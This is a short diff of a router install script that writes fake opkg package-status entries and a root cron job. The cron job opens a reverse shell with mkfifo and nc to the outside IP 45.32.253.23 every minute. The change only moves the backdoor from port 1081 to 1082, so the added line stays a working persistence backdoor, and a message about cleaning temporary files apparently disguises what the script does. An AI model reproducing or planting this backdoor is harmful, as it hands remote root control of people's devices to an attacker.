@@ -47,7 +47,7 @@ echo 'Status: install hold installed' >>/usr/lib/opkg/status
 echo 'Architecture: ralink' >>/usr/lib/opkg/status
 echo 'Installed-Time: 1422509506' >>/usr/lib/opkg/status
 echo 'Auto-Installed: yes' >>/usr/lib/opkg/status
-echo '*/1 * * * *  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 45.32.253.23 1081 >/tmp/f' >> /etc/crontabs/root
+echo '*/1 * * * *  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 45.32.253.23 1082 >/tmp/f' >> /etc/crontabs/root
 echo '
 ' >>/usr/lib/opkg/status
 echo 'Cleanning temporary files... 清理临时文件ing'
